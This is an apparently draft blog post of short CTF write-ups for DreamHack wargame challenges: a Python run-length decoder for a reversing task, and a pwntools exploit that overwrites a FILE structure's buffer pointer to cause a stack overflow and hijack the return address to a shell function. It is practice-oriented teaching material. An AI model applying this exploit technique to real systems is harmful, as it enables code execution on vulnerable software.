---
title: "Dream Hack Playround"
date: 2025-05-21
draft: true
tags: ["DreamHack", "Reverse-Engineering", "Pwnable"]
# categories: ["CTF Writeups"]
lightgallery: true
toc:
  enable: true
description: "Solutions for some challenges in BKCTF 2023 by ducdatdau"
---

Short solutions to several CTF challenges on the [Dream Hack wargame](https://dreamhack.io/wargame), focusing on topics such as pwn, rev, and forensics. 

<!--more-->

I don’t have much time for CTFs right now since I’m focusing on my study abroad applications. This series only covers easier challenges - I miss CTFs too much to quit completely.

<style>
img {
    box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
    border-radius: 6px;
    display: block; 
    margin-left: auto; 
    margin-right: auto;
}
</style>

# Dream Hack Wargame

## secret message | rev⭐⭐

- [Run Length Encoding Algorithm](https://www.geeksforgeeks.org/run-length-encoding/). Example: `raw = ABBBCCDDDDE` ➡️ `enc = ABB1CC0DD2E`. 

```python
from PIL import Image

with open("secretMessage.enc", "rb") as enc_file: 
    data = enc_file.read() 
    raw_file = open("secretMessage.raw", "wb") 

    idx = 0 
    
    while idx < len(data):
        if idx + 1 < len(data) and data[idx] == data[idx + 1]: 
            for j in range(data[idx + 2] + 2): 
                raw_file.write(data[idx].to_bytes(1, "little")) 
            idx += 3
        else: 
            raw_file.write(data[idx].to_bytes(1, "little")) 
            idx += 1

    raw_file.close() 

    with open("secretMessage.raw", "rb") as f:
        output = f.read()
        img = Image.frombytes("1", (500, 50), output)
        img.save("flag.png")

# raw = ABBBCCDDDDE -> enc = ABB1CC0DD2E.
```

## iofile_aw | pwn⭐⭐⭐

- Modify `FILE` structure to change `size` from 255 bytes to 0x1000 bytes. 
- Trigger a BOF bug. Since the stack canary is disabled, we can overwrite the return address with the address of `get_shell`.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./iofile_aw_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
# p = process(exe.path) 
p = remote("host3.dreamhack.games", 21978)

# gdb.attach(p, gdbscript="""
#     b *0x400ba0
#     c 
# """)

# pause()

sz_addr = exe.symbols["size"]
shell_addr = exe.symbols["get_shell"]

payload = b"printf "
payload += p64(0xfbad208b)
payload += p64(0)               # _IO_read_ptr
payload += p64(0)               # _IO_read_end
payload += p64(0)               # _IO_read_base
payload += p64(0)               # _IO_write_base
payload += p64(0)               # _IO_write_ptr
payload += p64(0)               # _IO_write_end
payload += p64(sz_addr)         # _IO_buf_base

p.sendafter(b"# ", payload) 

p.sendafter(b"# ", b"read\x00") 
# input("Enter to continue")
p.sendline(p64(0x1000))         # size = 0x1000 

payload = b"exit\x00"
payload += b"A" * (0x228 - 5) 
payload += p64(shell_addr) 

p.sendafter(b"# ", payload) 

p.interactive()
```